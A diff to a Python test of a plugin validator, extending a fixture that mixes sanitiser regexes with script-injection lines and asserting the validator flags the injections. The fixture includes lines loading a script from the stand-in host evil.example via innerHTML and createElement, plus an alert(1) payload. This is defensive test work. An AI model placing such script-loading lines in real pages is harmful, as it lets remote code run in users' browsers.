@@ -291,14 +291,18 @@ class TestDesktopSurface:
             "const clean = html.replace(/<script[\\s\\S]*?<\\/script>/gi, '').replace(/<style[\\s\\S]*?<\\/style>/gi, '')\n"
             "const ratio = total / count / 2\n"
             "el.innerHTML = '<script src=\"https://evil.example/x.js\"></script>'\n"
-            "const tag = document.createElement('script')\n"
+            "const tag = document.createElement('script'); tag.src = 'https://evil.example/x.js'; document.head.append(tag)\n"
+            "const dyn = html.replace(new RegExp(\"<script[\\\\s\\\\S]*?<\\\\/script>\", flags), '')\n"
+            "el.innerHTML = new RegExp('x') && '<script>alert(1)</script>'\n"
         ))
         report = validate_plugin_dir(d)
         failed = {name: detail for name, ok, detail in report.checks if not ok}
         assert "desktop surface" in failed
         assert ":1)" not in failed["desktop surface"]
+        assert ":5)" not in failed["desktop surface"]  # the same sanitiser via the RegExp constructor
         assert "script injection (desktop/plugin.js:3)" in failed["desktop surface"]
         assert "script injection (desktop/plugin.js:4)" in failed["desktop surface"]
+        assert "script injection (desktop/plugin.js:6)" in failed["desktop surface"]
 
     def test_prototype_patch_and_chunk_import_fail(self, tmp_path):
         d = self._desktop_plugin(tmp_path, (
